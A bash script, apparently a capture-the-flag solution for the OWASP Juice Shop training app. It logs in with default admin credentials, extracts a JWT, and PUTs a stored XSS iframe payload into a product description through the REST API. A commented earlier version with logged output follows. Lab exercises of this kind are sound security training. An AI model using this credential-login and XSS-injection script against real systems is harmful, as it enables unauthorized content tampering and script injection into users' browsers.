#! /bin/bash

ATTACK_TARGET_IP="10.0.1.2"
ATTACK_PORT="3000"

LOGIN_RESPONSE=$(curl -s -X POST "http://$ATTACK_TARGET_IP:$ATTACK_PORT/rest/user/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"admin123"}')

TOKEN=$(echo "$LOGIN_RESPONSE" | grep -o '"token":"[^"]*' | cut -d'"' -f4)

if [[ -z "$TOKEN" ]]; then
    echo "‚ùå Logging error, token was not downloaded."
    exit 1
fi

RESPONSE=$(curl -s -X PUT "http://$ATTACK_TARGET_IP:$ATTACK_PORT/api/Products/5" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "description": "<iframe src=\"javascript:alert(`xss`)\">"
    }')
RESULT=$? 

SUCCESS=$(echo "$RESPONSE" | grep -o '"status":"success"')

echo "‚û°Ô∏è XSS Response: $RESPONSE"

if [[ -n "$SUCCESS" && $RESULT -eq 0 ]]; then
    echo "‚úÖ XSS performed successfully. Exit code is 0."
else
    echo "‚ùå XSS performed unsuccessfully. Exit code is NOT 0!"
fi



# ###########################################################################################################################################
# # Based on https://www.youtube.com/watch?v=b6vKIpat8qQ&ab_channel=IAmAHacker
# # https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html

# # I Logging to Juice Shop and downloading JWT Token
# LOGIN_RESPONSE=$(curl -s -X POST "http://localhost:3000/rest/user/login" \
#     -H "Content-Type: application/json" \
#     -d '{"email":"admin@juice-sh.op","password":"admin123"}')

# # II Token Extraction
# TOKEN=$(echo "$LOGIN_RESPONSE" | grep -o '"token":"[^"]*' | cut -d'"' -f4)

# if [[ -z "$TOKEN" ]]; then
#     echo "‚ùå Logging error, token was not downloaded."
#     exit 1
# fi

# echo "‚úÖ Logged in succesfully -> Token JWT: $TOKEN"

# # III Perfomr OPTIONS for URL api/Products/5 (URL assumed using manual clicking [UI] and BurpSuite)
# OPTIONS_RESPONSE=$(curl -i -X OPTIONS "http://localhost:3000/api/Products/5" \
#     -H "Authorization: Bearer $TOKEN" \
#     -H "Access-Control-Request-Method: PUT" \
#     -H "Origin: http://localhost")

# echo "üîç OPTIONS:"
# echo "$OPTIONS_RESPONSE"

# # IV Execute GET at /api/Products/5
# RESPONSE=$(curl -s -X GET "http://localhost:3000/api/Products/5" \
#     -H "Authorization: Bearer $TOKEN" \
#     -H "Content-Type: application/json")

# echo "üîç Response for GET:"
# echo "$RESPONSE"


# # 5 PUT at /api/Products/5 (injecting script)
# PUT_RESPONSE=$(curl -s -X PUT "http://localhost:3000/api/Products/5" \
#     -H "Authorization: Bearer $TOKEN" \
#     -H "Content-Type: application/json" \
#     -d '{
#         "description": "<iframe src=\"javascript:alert(`xss`)\">"
#     }')

# echo "üîç‚úÖ Response for PUT:"
# echo "$PUT_RESPONSE"


# # info: Solved 3-star restfulXssChallenge (API-only XSS)
# # info: Cheat score for restfulXssChallenge solved in 38min (expected ~6min) with hints allowed: 0 

# # üîç‚úÖ Odpowied≈∫ na PUT:
# # {"status":"success","data":{"id":5,"name":"Lemon Juice (500ml)","description":"<iframe src=\"javascript:alert(xss)\">","price":2.99,"deluxePrice":1.99,"image":"lemon_juice.jpg","createdAt":"2025-02-27T23:26:14.208Z","updatedAt":"2025-02-28T00:25:52.995Z","deletedAt":null}}
